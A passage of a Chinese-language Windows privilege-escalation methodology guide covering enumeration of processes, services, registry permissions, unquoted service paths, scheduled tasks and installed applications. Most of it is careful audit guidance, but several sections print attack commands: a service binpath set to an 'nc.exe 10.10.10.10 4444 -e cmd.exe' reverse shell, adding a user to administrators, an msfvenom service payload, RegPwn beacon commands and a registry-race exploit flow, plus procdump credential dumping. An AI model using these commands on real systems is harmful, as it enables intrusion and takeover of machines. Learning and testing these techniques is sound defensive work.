### 已登录用户 / 会话

```bash
qwinsta
klist sessions
```

### 主文件夹

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### 密码策略

```bash
net accounts
```

### 获取剪贴板内容

```bash
powershell -command "Get-Clipboard"
```

## 正在运行的进程

### 文件和文件夹权限

首先，列出进程，**检查进程的命令行中是否包含密码**。\
检查你是否可以**覆盖正在运行的某个二进制文件**，或者是否对二进制文件所在文件夹具有写入权限，以利用潜在的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

始终检查是否有 [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) 正在运行；你可以滥用它来提升权限。

调试器监听端口可能只短暂开放，因此在一次被动端口快照中未发现它，并不能证明它从未暴露过。将观察到的监听端口与其 PID、进程所有者以及低权限用户是否能够访问该端口关联起来；仅凭应用名称或调试标志，无法证明能够跨用户执行代码。常规枚举应保持被动，不要发送调试器命令。

**检查进程二进制文件的权限**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)** **

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort 动态预处理器目录

Snort 2 可以从配置中声明的 `dynamicpreprocessor directory` 加载共享库；该配置由 `snort.exe -c <config>` 选定。对于以不同账户运行 Snort 的计划任务或服务，请检查其实际使用的配置以及所声明模块目录的 ACL。如果你的令牌可以在该目录中创建文件，那么当该任务或服务下次加载模块时，此路径可能涉及 code execution。请核实运行账户的有效权限、当前生效的配置、模块兼容性，以及是否存在拒绝规则或共享限制；仅凭目录可写并不能证明能够提权。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) 介绍了运行时模块加载。

### 可写文档根目录下的高权限 Web 服务

在 Windows Apache 安装中，请对比服务的可执行文件路径和运行账户，以及其当前生效的 `httpd.conf` 中的 `DocumentRoot`。对于常见的 XAMPP 布局，请检查 `C:\xampp\apache\conf\httpd.conf` 以及其中配置的文档根目录的 ACL，通常是 `C:\xampp\htdocs`。如果低权限用户可以在该根目录中创建文件，而 Apache 以 `LocalSystem` 身份运行，那么服务器端 code execution 可能跨越主机权限边界。请确认服务正在运行、实际提供的正是该路径，并且服务器端处理程序会处理该文件类型；仅凭根目录可写只能证明可以创建文件。检查 ACL 时不要写入探测文件：

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

对于常规的 WAMP 安装，服务可能指向带版本号的 `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32 位布局则为 `C:\wamp\...`），其配置文件位于旁边的 `conf\httpd.conf`，默认根目录为 `C:\wamp64\www` 或 `C:\wamp\www`。应一并检查确切的服务映像、运行身份、有效的 `DocumentRoot`（包括 `${INSTALL_DIR}` 的展开和虚拟主机覆盖项）以及根目录 ACL。WAMP 目录可写，并不能证明 Apache 以 `SYSTEM` 身份运行，也不能证明它会执行提交的文件。[Apache 说明了 Windows 服务如何选择配置](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 可写的 IIS 根目录和应用程序池网络身份

对于 IIS，应在 `applicationHost.config` 中将可写的物理目录对应到**活动站点/应用程序**，然后确定其配置的应用程序池和服务器端处理程序。只有当 IIS 会处理该文件类型且路由可访问时，放在已服务目录中的代码才会以应用程序池身份运行。在将可写目录视为代码执行入口之前，应检查当前用户有效的创建文件权限、站点运行状态、处理程序和针对路径的覆盖设置。

ASP.NET 动态编译还带来一条需要单独审查的路径：应用程序编译目录中的生成文件。默认情况下，该目录位于相关 .NET Framework 安装目录下的 `Temporary ASP.NET Files`，但应用程序的 `<compilation tempDirectory>` 可以更改此位置。[Microsoft 说明了该目录的位置和每个应用程序的子目录](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)，并且[建议在应用程序池彼此不信任时隔离编译目录](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。如果低权限令牌可以修改**特定**应用程序缓存中的生成源文件，应确认该应用程序是否会以更高权限的[工作进程身份](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)重新编译这些文件。仅凭文件或目录 ACL 并不能证明代码执行：应结合活动应用程序、有效令牌及 ACL、编译设置、进程身份以及重新编译的时间进行判断。仅审查只读元数据；枚举期间不要触发编译或修改缓存文件。

配置为 `ApplicationPoolIdentity` 或 `NetworkService` 的 IIS 池通常会以**主机计算机帐户**身份向域资源进行身份验证，即使其本地令牌权限较低也是如此。`LocalSystem` 在本地已具有高权限，在网络上也使用计算机帐户；`LocalService` 通常使用匿名网络凭据。`SpecificUser` 池则使用其配置的帐户。[Microsoft 说明了这些身份类型](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)以及[应用程序池网络身份](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)。省略的身份设置可能会继承应用程序池默认值，而不同 IIS 版本的默认值可能不同，因此应解析有效配置，不要根据池名称猜测。如果代码执行进入使用计算机帐户网络身份的池，应评估**该特定计算机**的目录权限。[DCSync](../active-directory-methodology/dcsync.md) 需要对域命名上下文具有复制权限；仅有计算机帐户票据或主机角色，并不能证明具备这些权限。被动枚举应检查配置和 ACL，不要上传文件、发起网络身份验证或请求票据。

对于会启动辅助进程的可读 ASP.NET 处理程序，应追踪任何源自请求的值经过身份验证、解密、验证和命令构造的全过程。若处理程序将解码后的令牌拼接到 `ProcessStartInfo("cmd", "/c ...")` 中，可能会使 shell 元字符改变命令；[Microsoft 说明了 `cmd` 的特殊字符](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。应确认不可信调用者确实能够影响解码后的值并访问该处理程序，然后确定有效的应用程序池身份或模拟身份，以及子进程的身份。仅有一行可读源码、一个 localhost 监听器或令牌格式缺陷，并不能证明可以执行高权限命令。被动枚举期间，应审查源码和应用程序池配置，不要发送伪造请求或运行辅助进程。

对于 Windows 上的 PHP 服务，如果请求控制的路径被传递给 [`include` 或 `require`](https://www.php.net/manual/en/function.include.php)，就可能以工作进程身份执行低权限用户可写的 PHP 文件。应确认请求能够到达该语句、解析后的路径指向低权限用户可修改且工作进程可读取的文件、适用的 PHP 路径限制允许包含该文件，并且工作进程实际以更高权限运行。仅有回环监听器或可写文件并不能证明这条利用链成立；被动枚举期间，应检查源码、服务身份和文件 ACL，不要调用该端点。

### 内存密码挖掘

可以使用 sysinternals 中的 **procdump** 为正在运行的进程创建内存转储。FTP 等服务会将**明文凭据保存在内存中**，可以尝试转储内存并读取凭据。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD，或浏览目录。**

示例："Windows 帮助和支持"（Windows + F1），搜索 "command prompt"，点击 "Click to open Command Prompt"

### 特权项目文件导入

如果某个应用会自动打开低权限用户可写入的投放目录中的项目，那么它就在导入程序的账户上下文中跨越了输入信任边界。检查**确切的可写路径**、打开该路径的进程或任务、其有效身份，以及解析器版本。[Ghidra 项目打开/恢复问题的历史案例](https://github.com/NationalSecurityAgency/ghidra/issues/71)允许在项目元数据中使用 XML 外部实体；如果[出站 SMB 和 NTLM 策略](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)允许，Windows 上的网络实体可能会触发导入账户进行身份验证。这是凭据泄露线索，并不意味着可立即获得管理员权限：必须能通过另一条经过授权或存在漏洞的路径利用响应，并且必须根据实际补丁状态评估当前版本。被动枚举期间不要打开特制项目；检查导入工作流和 ACL。

## 服务

服务控制管理器（SCM）对象的 [`SC_MANAGER_CREATE_SERVICE` 权限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)与现有服务的权限是分开的。成功发出针对该权限的只读 [`OpenSCManager` 访问请求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)只是值得进一步检查的线索，并不能证明可以运行新服务。[`CreateService` 会返回一个句柄](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)，该句柄具有创建时请求的服务访问权限；之后重新打开服务会进行单独的访问检查，即使原始句柄可用，重新打开也可能失败。分别核实有效的本地或远程令牌、已授予的句柄权限、服务账户、启动策略和可执行文件路径。被动枚举期间不要创建或启动服务。

对于远程服务安装路径，应将这些 SCM 权限与目标上的共享进行关联：同一个网络登录账户必须能够写入该共享；还要检查其底层 NTFS ACL，以及服务账户能够运行的本地可执行文件路径。如果 SCM 权限异常宽松且文件放置路径也可用，非管理员账户也可能跨越此边界；并非必须具备管理共享权限。仅有共享写入权限，或仅发现 SCM 创建服务线索，都不能证明新服务可以以更高权限身份启动。

现有服务可能会在启动、关闭或其他生命周期事件中调用辅助可执行文件，即使该辅助文件未出现在其 `ImagePath` 中。如果辅助文件名会被解析到低权限用户可写入的目录，且服务以更高权限身份运行，那么缺失的辅助文件可能是有条件的替换目标。确认**实际服务代码或有文档记录的辅助程序调用方式**、解析后的可执行文件路径和搜索顺序、目录创建权限、服务身份，以及可用的生命周期触发条件。仅有可写服务目录或缺失文件，并不能证明服务会加载该文件；被动检查时不要启动或停止服务。

对于现有服务，[`SERVICE_START` 允许向 `StartService` 提供参数](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)；它与 [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) 不同。在将启动权限视为不止是一项控制权限之前，先检查服务代码或有文档记录的接口。如果服务使用调用者选择的参数作为日志或导出路径，应核实服务身份、参数到写入操作的确切流程、路径限制，以及**所创建文件**的权限。只有在另有特权使用者或加载器会接受该文件时，向受保护目录写入才可能导致权限提升；仅有可写日志或启动权限并不足够。被动盘点时不要启动服务或创建测试文件。

对于 NSClient++ 监控代理，可读取的 `nsclient.ini` 是一个**配置检查线索**：其中可能包含 Web 凭据，而 `boot.ini` 可以将配置重定向到其他位置。检查实际服务账户、WEB 监听器和访问策略，以及已认证角色是否能够更改设置或脚本。要实现特权执行，还必须启用 `CheckExternalScripts`（或其他执行路径）、具备注册或修改命令的有效权限，并有能以服务身份运行该命令的触发条件。仅限 loopback 的监听器仍可能被本地用户访问，但仅凭文件路径、密码或监听器并不能证明具备这些权限。被动枚举期间检查元数据和权限，不要显示机密或调用 Web API。参见 [NSClient++ 文件布局](https://nsclient.org/docs/concepts/file-layout/)、[Web 和脚本安全指南](https://nsclient.org/docs/setup/securing/)以及[外部脚本配置](https://nsclient.org/docs/reference/check/CheckExternalScripts/)。

对于 `ImagePath` 为 `nssm.exe` 的服务，应检查该服务实际使用的运行账户及其 `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` 值：[NSSM 在此处存储子应用程序](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)，而 `AppDirectory` 是其配置的工作目录。在将包装程序的权限视为整个服务边界之前，先检查子可执行文件及其父目录 ACL。该子程序暴露的本地 WCF 或 SOAP 端点是另一条值得检查的线索：确认低权限用户可以访问该监听器、具体操作会接受其输入，以及服务子程序会以更高权限身份执行不安全操作。服务账户、端点 URL 或可写路径本身都不能证明存在权限提升；被动枚举期间不要调用服务操作。

对于自定义 WCF 操作，应追踪调用者可控字符串是否流入任何 PowerShell runspace。[`Pipeline.Commands.AddScript` 会添加脚本文本](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)，而 [`Pipeline.Invoke` 会运行该 pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。使用 Windows 传输凭据的 [`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) 会对客户端进行身份验证，但必须另外检查调用该**特定**操作的授权，以及 runspace 的有效身份。低权限调用者的输入流入高权限服务身份下的 `AddScript`，构成代码执行边界；仅有监听端口、已认证客户端，或无关程序集中的未使用方法，都不能作为存在漏洞的证据。枚举期间应静态检查已部署的服务、契约、授权和模拟设置，不要调用端点。

Service Triggers 可以让 Windows 在某些条件发生时启动服务（命名管道/RPC 端点活动、ETW 事件、IP 可用性、设备接入、GPO 刷新等）。即使没有 SERVICE_START 权限，通常也可以通过触发这些条件来启动特权服务。此处提供枚举和触发技术：

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 诊断收集器服务

带有 C/C++ 工具的 Visual Studio 安装可能包含 `VSStandardCollectorService150`，这是一个配置为以 `LocalSystem` 身份运行的诊断服务。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) 利用了 junction 和对象管理器链接竞态来重定向服务 DACL 重置。该演示中的权限提升还需要可用的 Visual Studio Setup WMI Provider MSI 修复路径，以及其 `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` 目标文件。该组件已于 2024 年 1 月修复。

被动初筛时，检查该服务的账户和二进制文件路径，确认 Setup WMI 编译器路径是否存在，并核实已安装组件的补丁状态。仅有服务条目、Visual Studio 产品版本或编译器文件，都不能证明主机存在漏洞。检查时无需启动服务或运行修复。

获取服务列表：

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 权限

你可以使用 **sc** 获取服务信息

```bash
sc qc <service_name>
```

建议使用 _Sysinternals_ 的 **accesschk** 二进制文件检查每个服务所需的权限级别。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

建议检查 "Authenticated Users" 是否可以修改任何服务：

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[你可以在此处下载适用于 XP 的 accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果遇到此错误（例如使用 SSDPSRV 时）：

_系统错误 1058。_\
_无法启动服务，因为该服务已被禁用，或者没有与其关联的已启用设备。_

你可以使用以下命令启用它。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**请注意，服务 upnphost 依赖 SSDPSRV 才能运行（适用于 XP SP1）**

**解决此问题的另一种方法**是运行：

```
sc.exe config usosvc start= auto
```

### **修改服务二进制文件路径**

如果“Authenticated users”组对某个服务拥有 **SERVICE_ALL_ACCESS** 权限，则可以修改该服务的可执行二进制文件。要修改并执行 **sc**：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### 重启服务

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

可以通过各种权限提升特权：

- **SERVICE_CHANGE_CONFIG**：允许重新配置服务二进制文件。
- **WRITE_DAC**：允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**：允许获取所有权并重新配置权限。
- **GENERIC_WRITE**：同样允许更改服务配置。
- **GENERIC_ALL**：同样允许更改服务配置。

检测和利用此漏洞时，可以使用 _exploit/windows/local/service_permissions_。

### 服务二进制文件权限过弱

如果服务以 **`LocalSystem`**、**`LocalService`**、**`NetworkService`** 或特权域帐户身份运行，但**低权限用户可以修改服务 EXE 或其父文件夹**，通常就可以通过**替换二进制文件并重启服务**来劫持该服务。

**检查你是否可以修改服务执行的二进制文件**，或者是否对**该二进制文件所在的文件夹具有写入权限**（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
你可以使用 **wmic**（不在 system32 中）获取服务执行的所有二进制文件，并使用 **icacls** 检查权限：

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

你还可以使用 **sc** 和 **icacls**：

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

查找授予 **`Everyone`**、**`BUILTIN\Users`** 或 **`Authenticated Users`** 的危险 ACL，尤其是服务可执行文件或其所在目录上的 **`(F)`**、**`(M)`** 或 **`(W)`**。一种实用的滥用流程如下：<sup>[[27]](#references)</sup>

1. 使用 `sc qc <service_name>` 确认服务帐户和可执行文件路径。
2. 使用 `icacls <path>` 确认二进制文件可写。
3. 将服务二进制文件替换为 payload 或有效的恶意服务二进制文件。
4. 使用 `sc stop <service_name> && sc start <service_name>` 重启服务（或者等待重启 / 服务触发器）。

实用的自动化检查：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> 如果服务不允许普通用户重启，请检查它是否会在启动时自动运行、是否配置了在发生故障时重新启动的操作，或者能否通过使用该服务的应用间接触发。

### 修改服务注册表的权限

你应该检查是否可以修改任何服务注册表项。\
你可以通过以下方式**检查**你对某个服务**注册表项**的**权限**：

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

原始权限测试表述如下：

应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果有，则可以修改服务执行的二进制文件。

检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否对特定服务项具有可写的注册表权限。仅有 ACL 条目并不能证明实际拥有访问权限：拒绝条目、当前令牌和继承的权限都会产生影响。注册表项权限与服务对象的 `SERVICE_CHANGE_CONFIG` 和 `SERVICE_START` 权限是分开的。要进行权限提升，还需要存在可用的服务配置字段、触发服务的方式，以及权限更高的服务身份。请参阅 Microsoft 的[注册表项权限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)和[服务访问权限参考](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)。

要更改执行的二进制文件的 Path：

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race：任意 HKLM 值写入（ATConfig）

某些 Windows 辅助功能会创建每用户的 **ATConfig** 键，之后由 **SYSTEM** 进程将其复制到 HKLM 会话键。注册表 **symbolic link race** 可将这次特权写入重定向到**任意 HKLM 路径**，从而获得任意 HKLM **值写入**能力。<sup>[[18]](#references)</sup>

关键位置（示例：屏幕键盘 `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的辅助功能。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储用户可控的配置。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 在登录/安全桌面切换期间创建，且用户可写入。

利用流程（CVE-2026-24291 / ATConfig）：

1. 填入你希望由 SYSTEM 写入的 **HKCU ATConfig** 值。
2. 触发安全桌面复制（例如调用 **LockWorkstation**），启动 AT broker 流程。
3. **赢得 race**：在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上设置 **oplock**；oplock 触发时，将 **HKLM Session ATConfig** 键替换为指向受保护 HKLM 目标的 **registry link**。
4. SYSTEM 将攻击者选择的值写入重定向后的 HKLM 路径。

获得任意 HKLM 值写入能力后，可通过覆盖服务配置值实现 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/命令行）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

选择普通用户可以启动的服务（例如 **`msiserver`**），并在写入后触发该服务。**注意：**公开的 exploit 实现会在 race 过程中**锁定工作站**。

示例工具（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory 权限

如果你对某个注册表拥有此权限，这意味着**你可以在其下创建子注册表项**。对于 Windows 服务来说，这**足以执行任意代码**：

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果可执行文件的路径没有用引号括起来，Windows 会尝试执行每个空格前的路径部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

列出所有未加引号的服务路径，但排除内置 Windows 服务的路径：

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**你可以使用 metasploit 检测并利用**此漏洞：`exploit/windows/local/trusted\_service\_path` 你可以使用 metasploit 手动创建服务二进制文件：

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 恢复操作

Windows 允许用户指定服务失败时要执行的操作。此功能可以配置为指向一个二进制文件。如果该二进制文件可被替换，就可能实现提权。更多详情请参阅 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)。

## 计划任务脚本目标

对于已启用且使用 `cmd.exe /c` 运行 `.bat` 或 `.cmd` 文件的任务，请检查 **操作参数** 中指定的脚本以及 `cmd.exe`。解释器显式指定的文件参数也同样需要检查，例如 PowerShell 的 `-File`。如果计划批处理文件中包含字面形式的 PowerShell `-File` 调用，也要检查被引用脚本的 ACL；变量、条件语句和 shell 命令链需要手动追踪。只有当任务配置的主体与调用者不同时，调用者可写的脚本或父目录才可能成为跨账户执行的线索，并且任务确实必须执行到该操作。对于脚本，允许仅追加内容的 ACL 可能也很重要，但前面的 `exit` 或其他控制流可能导致追加的行无法执行。在声称存在提权可能之前，请确认有效 ACL、[task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、工作目录、触发器和应用程序控制策略。清点过程中不应修改脚本或启动任务。

## 可访问文件中的命名流

在 NTFS 上，可读文件可能包含命名的 `:$DATA` 流，其内容不会显示在普通目录列表中。对于数量有限且相关的可访问备份文件或配置文件，请先检查流的**名称和大小**，再打开任何内容；Windows 可通过 [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) 和 PowerShell 的 [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) 枚举这些流。暗示其中包含秘密的流名称仅是线索。请检查文件的有效读取权限、文件系统是否支持流、流中是否包含可用凭据，以及这些凭据实际验证的是哪个账户。日常枚举时应避免递归扫描流，也不要打印流内容。

## 计划任务中的 Windows Driver Kit 辅助程序输入文件

可选的 Windows Driver Kit 包含 `StandaloneRunner.exe`，它可以从其运行目录读取 `command.txt`、`reboot.rsf` 和项目的 `working\rsf.rsf` 文件。以特权账户启动此辅助程序的计划任务或服务，可能会让低权限用户对这些输入文件的写入权限转化为在该账户上下文中执行命令，即使辅助程序可执行文件本身受到保护也一样。请确认存在特权消费者，并且**两个**旁置文件都可以创建或修改；仅发现该辅助程序并不足以证明存在此问题。

对于计划任务，请检查其操作的 [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) 和两个旁置文件路径的 ACL。如果任务未指定工作目录，那么可执行文件所在目录只能作为待验证的线索，不能证明任务会从该目录读取输入文件。还必须满足项目工作文件这一前提。请检查任务实际使用的主体，不要假设它以 SYSTEM 身份运行。

## 应用程序

### 已安装的应用程序

检查**二进制文件的权限**（也许可以覆盖其中一个来提升权限）以及**文件夹的权限**（[DLL Hijacking](dll-hijacking/index.html)）。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent 修复路径

[CVE-2024-0670](https://checkmk.com/werk/16361) 影响较旧的 Checkmk Windows agent：当其无法替换文件时，会在 `C:\Windows\Temp` 中写入命令文件，随后执行一个预先存在且受写保护的文件。供应商已在 2.1.0p40、2.2.0p23、2.3.0b1 和 2.4.0b1 中修复此问题。请检查完整的已安装补丁级别，以及受影响的 agent 操作是否能够运行；仅有 `2.1` 之类的分支标签无法确定是否存在漏洞。枚举时可以检查版本、服务状态和 Temp 权限，而不创建文件或触发 agent 命令。

#### ADSelfService Plus SAML 服务检查

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) 影响 6210 及更早版本的 ADSelfService Plus；供应商已在 6211 版本中修复。只有在启用过或当前启用了 SAML SSO 时，此问题才相关。因此，已安装产品条目或服务路径只是线索，并不能直接判定存在漏洞：请确认确切版本、SAML 配置历史、服务的网络可达性，以及服务运行所用的账户。通过该服务执行的代码会继承该账户的权限；只有以 SYSTEM 运行的实例才会以 SYSTEM 身份执行。产品 Backup 目录中可读取的 `OfflineBackup_*.ezip` 是单独的加密备份线索，并不能证明其中含有可用凭据，也不能证明存在此 SAML 漏洞。常规枚举期间请记录其路径和访问权限，不要解包。

#### Jenkins controller 与域账户边界

在 Windows Jenkins controller 上，请区分创建或配置 job 的权限与启动 job 的权限：[Jenkins 将这些权限分别列为 `Job/Create`、`Job/Configure` 和 `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/)。已配置的计划任务或远程触发器可能提供另一种启动 build 的途径，但请确认其已启用且 build 确实会运行。执行时使用的是 controller 或所选 agent 的身份；只有 job 能访问某个凭据的作用范围时，才可以使用该凭据。另请检查对 `JENKINS_HOME` 元数据的访问权限：Jenkins 将凭据材料和加密密钥保存在 `credentials.xml`、`secrets/hudson.util.Secret` 和 `secrets/master.key` 中（[Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。这些文件存在本身并不会泄露密码；请确认**对所需文件具有读取权限**，并确认存在独立的账户复用路径，避免在共享输出中打印机密。如果该账户具有对 AD 用户对象 `scriptPath` 的写权限，请确认脚本路径可写，并且存在一个以目标用户身份运行的真实登录或计划任务使用者，然后再将其视为跨用户执行。进一步控制组的能力需要单独验证有效的 AD 权限。

#### Azure Pipelines 自托管 agent 身份

